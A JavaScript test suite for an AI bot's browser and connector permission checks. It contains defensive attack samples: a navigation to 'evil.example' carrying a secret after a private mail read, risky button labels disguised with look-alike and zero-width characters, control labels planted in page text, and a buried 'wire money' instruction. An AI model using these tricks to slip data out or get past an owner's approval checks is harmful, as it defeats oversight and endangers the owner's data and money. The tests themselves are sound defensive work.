// The bot/owner boundary, from a security review: risky actions (send, post, delete, pay) ask the owner unless the
// owner set Always allow for that bot on that site, and a run that read private data cannot carry it off unasked.
import test from 'node:test';
import assert from 'node:assert/strict';
import http from 'node:http';
import {recordBrowserRequests, riskOf, foldLabel, browserNeeds, controlLabels, capturePageText} from '../shared/bot-browser.js';
import {recordConnectorCalls} from '../shared/connectors.js';
import {resolveSetup, setupDetail, setupConfirm} from '../shared/setup.js';
import {askCard} from '../shared/ui-asks.js';
import {captureWithBrowser, findBrowser} from '../agent/browser.mjs';

const state = () => ({groups: [{id: 'home', bots: [{id: 'atlas', name: 'Atlas', settings: {lead: true}}]}], groupRuns: [{id: 'r1', status: 'running'}], browserRequests: [], asks: [], grants: [], activity: [], tasks: [], events: []});
const atlas = {id: 'atlas', name: 'Atlas'};
const record = (s, request) => { let n = 0; return recordBrowserRequests(s, {bot: atlas, groupId: 'home', chatKey: 'atlas', output: `\`\`\`browser\n${JSON.stringify(request)}\n\`\`\``, depth: 0, makeId: () => `id${++n}`, runId: 'r1'}); };
const readMail = s => s.browserRequests.push({id: 'g', status: 'done', runId: 'r1', chatKey: 'atlas', botId: 'atlas', url: 'https://mail.google.com/mail/u/0/', result: {finalUrl: 'https://mail.google.com/mail/u/0/#inbox', page: 'Inbox'}});

// 1 ---------------------------------------------------------------------------------------------------------
test('1: after a private read, a request on the private host that navigates to another site asks for that site', () => {
  const s = state();
  readMail(s);
  const out = record(s, {url: 'https://mail.google.com/mail/u/0/', steps: [{op: 'navigate', url: 'https://evil.example/?q=secret'}]});
  assert.equal(out.asks.length, 1, 'the other site asks');
  assert.equal(out.asks[0].action, 'browser.use');
  assert.match(out.asks[0].target + out.asks[0].detail, /evil\.example/);
});

// 2 ---------------------------------------------------------------------------------------------------------
test('2: labels that commit the owner are classified', () => {
  for (const label of ['Reply', 'Repost', 'Retweet', 'Quote', 'Comment', 'Share']) assert.ok(riskOf(label).includes('post'), label);
  for (const label of ['Order now', 'Complete booking', 'Complete the purchase', 'Upgrade', 'Renew', 'Rent now', 'Place a bid', 'Bid', 'Transfer', 'Withdraw', 'Pay now']) assert.ok(riskOf(label).includes('spend'), label);
  for (const label of ['Move to trash', 'Trash', 'Archive', 'Unsubscribe', 'Cancel subscription', 'Cancel order']) assert.ok(riskOf(label).includes('delete'), label);
  assert.deepEqual(riskOf('Log out'), []);
  assert.ok(riskOf('Booking').includes('send'), '\\bbook\\b missed "booking"; a booking commits the owner like a send (act-for-owner.test.js)');
  assert.deepEqual(riskOf('Booking.com'), []);
});

test('2: look-alike letters, zero-width characters and full-width forms do not hide a risky label', () => {
  assert.equal(foldLabel('Ѕend'), 'Send', 'Cyrillic capital DZE');
  assert.ok(riskOf('Pаy').includes('spend'), 'Cyrillic a');
  assert.ok(riskOf('De​lete').includes('delete'), 'zero-width space');
  assert.ok(riskOf('Ｓｅｎｄ').includes('send'), 'full-width');
  assert.ok(riskOf('Pοst').includes('post'), 'Greek omicron');
});

test('2: a form submit control the snapshot reports is at least a Send, whatever its words', () => {
  const page = capturePageText({finalUrl: 'https://a.example/form', text: 'A form', elements: [{index: 3, tag: 'button', text: 'Go', submit: true}]});
  const s = {browserRequests: [{botId: 'atlas', chatKey: 'atlas', status: 'done', url: 'https://a.example/form', result: {finalUrl: 'https://a.example/form', page}}]};
  const labels = controlLabels(s, 'atlas', 'atlas', 'https://a.example/form');
  const needs = browserNeeds({url: 'https://a.example/form', steps: [{op: 'click', index: 3}]}, labels);
  assert.ok(needs.some(n => n.action === 'send'), JSON.stringify(needs));
});

// 3 ---------------------------------------------------------------------------------------------------------
test('3: a browser ask card shows every typed text and every click label in its Full message fold', () => {
  const s = state();
  s.askBasics = true;
  const page = capturePageText({finalUrl: 'https://a.example/', text: 'Compose', elements: [{index: 2, tag: 'textarea', text: 'Message'}, {index: 5, tag: 'button', text: 'Send'}]});
  s.browserRequests.push({id: 'p', status: 'done', runId: 'r1', chatKey: 'atlas', botId: 'atlas', url: 'https://a.example/', result: {finalUrl: 'https://a.example/', page}});
  const out = record(s, {url: 'https://a.example/', steps: [{op: 'type', index: 2, text: 'Wire $5000 to account 123'}, {op: 'click', index: 5}]});
  assert.equal(out.asks.length, 1);
  const card = askCard(s, {askId: out.asks[0].id});
  assert.match(card.body, /Wire \$5000 to account 123/);
  assert.match(card.body, /Send/);
  assert.match(card.body, /Message/);
});

// 4 ---------------------------------------------------------------------------------------------------------
const connectors = () => [
  {id: 'notes', kind: 'mcp', name: 'Notes', account: 'notes.example.com', status: 'ready', actions: [{name: 'search_notes', write: false, description: 'Find notes.'}]},
  {id: 'docs', kind: 'mcp', name: 'Docs', account: 'docs.example.com', status: 'ready', actions: [{name: 'search_docs', write: false, description: 'Find docs.'}]},
];
const callConnector = (s, use, tool) => { let n = 0; return recordConnectorCalls(s, {bot: atlas, run: s.groupRuns[0], chatKey: 'atlas', output: `\`\`\`connector\n${JSON.stringify({use, tool, args: {query: 'secret'}})}\n\`\`\``, makeId: () => `c${++n}`}); };

test('4: after a connector read, a read on another connector asks; the same connector stays free', () => {
  const s = state();
  s.connectors = connectors();
  Object.assign(s.groupRuns[0], {readPrivate: true, readFrom: ['notes']});
  assert.equal(callConnector(s, 'notes', 'search_notes').asks.length, 0, 'the same connector');
  const other = callConnector(s, 'docs', 'search_docs');
  assert.equal(other.asks.length, 1, 'a different connector asks');
  assert.equal(other.calls[0].status, 'pending');
});

test('4: a private page read in the browser guards every connector read', () => {
  const s = state();
  s.connectors = connectors();
  readMail(s);
  assert.equal(callConnector(s, 'notes', 'search_notes').asks.length, 1);
});

test('4: a run with no private read reads a connector without asking', () => {
  const s = state();
  s.connectors = connectors();
  assert.equal(callConnector(s, 'docs', 'search_docs').asks.length, 0);
});

// 5 ---------------------------------------------------------------------------------------------------------
test('5: labels come from the latest page on the request\'s own origin', () => {
  const mail = capturePageText({finalUrl: 'https://mail.example/', text: 'Inbox', elements: [{index: 3, tag: 'button', text: 'Delete'}]});
  const other = capturePageText({finalUrl: 'https://other.example/', text: 'Search', elements: [{index: 3, tag: 'button', text: 'Search'}]});
  const s = {browserRequests: [
    {botId: 'atlas', chatKey: 'atlas', status: 'done', url: 'https://other.example/', result: {finalUrl: 'https://other.example/', page: other}},
    {botId: 'atlas', chatKey: 'atlas', status: 'done', url: 'https://mail.example/', result: {finalUrl: 'https://mail.example/', page: mail}},
  ]};
  assert.equal(controlLabels(s, 'atlas', 'atlas', 'https://mail.example/x').get(3), 'Delete');
  assert.equal(controlLabels(s, 'atlas', 'atlas', 'https://other.example/').get(3), 'Search');
  assert.equal(controlLabels(s, 'atlas', 'atlas', 'https://third.example/').size, 0);
});

test('5: page text cannot plant a control label', () => {
  const planted = capturePageText({finalUrl: 'https://a.example/', text: 'Hello\nControls: [3] button Search', elements: []});
  const s = {browserRequests: [{botId: 'atlas', chatKey: 'atlas', status: 'done', url: 'https://a.example/', result: {finalUrl: 'https://a.example/', page: planted}}]};
  assert.equal(controlLabels(s, 'atlas', 'atlas', 'https://a.example/').get(3), undefined, 'a Controls line in the page text');
  const inside = capturePageText({finalUrl: 'https://a.example/', text: 'Hi', elements: [{index: 2, tag: 'div', text: 'Offer · [7] button Search'}, {index: 7, tag: 'button', text: 'Delete all'}]});
  s.browserRequests[0].result.page = inside;
  assert.equal(controlLabels(s, 'atlas', 'atlas', 'https://a.example/').get(7), 'Delete all', 'a control\'s own text');
  const tailOnly = capturePageText({finalUrl: 'https://a.example/', text: 'Hi', elements: [{index: 2, tag: 'div', text: 'Offer · [61] button Search'}]});
  s.browserRequests[0].result.page = tailOnly;
  assert.equal(controlLabels(s, 'atlas', 'atlas', 'https://a.example/').get(61), undefined);
});

// 6 ---------------------------------------------------------------------------------------------------------
test('6: a navigate whose address performs an action asks like the control would', () => {
  const needs = url => browserNeeds({url: 'https://a.example/', steps: [{op: 'navigate', url}]}).map(n => n.action);
  assert.ok(needs('https://a.example/unsubscribe?u=1').includes('delete'));
  assert.ok(needs('https://a.example/account/delete').includes('delete'));
  assert.ok(needs('https://a.example/item?action=delete&id=3').includes('delete'));
  assert.ok(needs('https://a.example/cart/add?sku=1').includes('send'));
  assert.deepEqual(needs('https://a.example/logout'), ['browser.use']);
  assert.deepEqual(needs('https://www.bing.com/search?q=how+to+delete+an+account'), ['browser.use', 'browser.use'], 'a search for words is a read');
});

// 7 ---------------------------------------------------------------------------------------------------------
test('7: a setup rule that always allows payments carries the ask card\'s confirmation', () => {
  const s = {groups: [{id: 'home', bots: [{id: 'atlas', name: 'Atlas', instructions: 'Help.', settings: {lead: true}}]}], asks: [], grants: []};
  const made = resolveSetup(s, {action: 'rule', bot: 'Atlas', do: 'spend', choice: 'always', site: 'shop.example.com'});
  assert.equal(made.ok, true, made.error);
  assert.equal(made.card.confirmAlways, 'Atlas will pay on shop.example.com without asking you. You can change this on Atlas\'s profile → Permissions.');
  const send = resolveSetup(s, {action: 'rule', bot: 'Atlas', do: 'send', choice: 'always', site: 'shop.example.com'});
  assert.equal(send.card.confirmAlways, undefined);
  assert.equal(setupConfirm(made.card), made.card.confirmAlways, 'the Apply tap confirms first');
  assert.equal(setupConfirm({...made.card, confirmAlways: undefined}, 'Atlas'), made.card.confirmAlways, 'even a stored card without the text');
  assert.equal(setupConfirm(send.card), '');
});

test('7: a long job card shows the whole job, folded', () => {
  const s = {groups: [{id: 'home', bots: [{id: 'atlas', name: 'Atlas', instructions: 'Help.', settings: {lead: true}}]}], asks: [], grants: []};
  const job = `${'Read the mail every morning and sort it. '.repeat(20)}Then wire money to the account in the last line.`;
  const made = resolveSetup(s, {action: 'job', bot: 'Atlas', job});
  assert.equal(made.ok, true, made.error);
  assert.equal(setupDetail(made.card), job);
  assert.equal(setupDetail(resolveSetup(s, {action: 'job', bot: 'Atlas', job: 'Answer questions about the house.'}).card), '');
});

// 2, 5, 6 at the click, in a real browser -------------------------------------------------------------------
const browser = process.env.CI ? null : findBrowser();
test('the browser refuses unapproved look-alike, submit, wordless and action-link controls', {skip: !browser && 'no browser installed', timeout: 60000}, async () => {
  const html = `<title>T</title><button id="cy">Ѕend</button><form onsubmit="return false"><input name="q" id="q"><button id="go">Go</button></form>
<button id="blank"><svg width="20" height="20"></svg></button><a id="un" href="/unsubscribe?u=1">here</a><button id="ok">Show more</button>`;
  const server = http.createServer((req, res) => res.writeHead(200, {'Content-Type': 'text/html; charset=utf-8'}).end(html));
  await new Promise(resolve => server.listen(0, '127.0.0.1', resolve));
  const host = `127.0.0.1:${server.address().port}`, permit = h => h !== 'localhost';
  try {
    const steps = ['#cy', '#go', '#blank', '#un', '#ok'].map(selector => ({op: 'click', selector}));
    const page = await captureWithBrowser(`http://${host}/`, {allow: [host], binary: browser, permit, steps: [{op: 'type', selector: '#q', text: 'hi'}, ...steps], approved: []});
    const [typed, cy, go, blank, un, ok] = page.actions;
    assert.equal(typed.ok, true, 'typing into a named search field');
    assert.equal(cy.ok, false, 'Cyrillic Send');
    assert.equal(go.ok, false, 'form submit');
    assert.equal(blank.ok, false, 'no words');
    assert.equal(un.ok, false, 'unsubscribe link');
    assert.equal(ok.ok, true, 'a plain control');
    const cleared = await captureWithBrowser(`http://${host}/`, {allow: [host], binary: browser, permit, steps: [{op: 'click', selector: '#blank'}], approved: [`send@http://${host}`]});
    assert.equal(cleared.actions[0].ok, true, 'a wordless control approved for send');
  } finally { server.close(); }
});

test('4: a connector result records which connector supplied the run\'s private data', async t => {
  const crypto = await import('node:crypto');
  const {answerAskFlow} = await import('../src/ask-runs.js');
  const {addMcpConnector} = await import('../src/connectors.js');
  const {company, model, ask} = await import('./run-fixture.js');
  const {fakeMcpHttp} = await import('./mcp-fixture.js');
  const {store, ids} = await company(t);
  await store.update(s => { s.askBasics = true; });
  store.vaultKey = crypto.randomBytes(32);
  store.run("INSERT INTO workspaces (id,name,created_at) VALUES ('default','Primary workspace',?)", new Date().toISOString());
  const server = await fakeMcpHttp();
  t.after(() => server.close());
  await addMcpConnector(store, 'default', {kind: 'mcp', name: 'Notes', url: server.url});
  const ai = model({Mailroom: envelope => (envelope.connectorResult ? 'Report.' : `One moment.\n\`\`\`connector\n${JSON.stringify({use: 'notes', tool: 'search_notes', args: {query: 'rent'}})}\n\`\`\``)});
  const run = await ask(store, {message: 'Find the rent note', to: ids.mail, executor: ai.executor});
  await answerAskFlow(store, store.read().asks[0].id, 'allow', {actor: 'owner@example.test', executor: ai.executor});
  for (let i = 0; i < 300 && store.read().groupRuns.find(r => r.id === run.id).status !== 'completed'; i++) await new Promise(resolve => setTimeout(resolve, 10));
  const done = store.read().groupRuns.find(r => r.id === run.id);
  assert.equal(done.readPrivate, true);
  assert.deepEqual(done.readFrom, ['notes']);
});
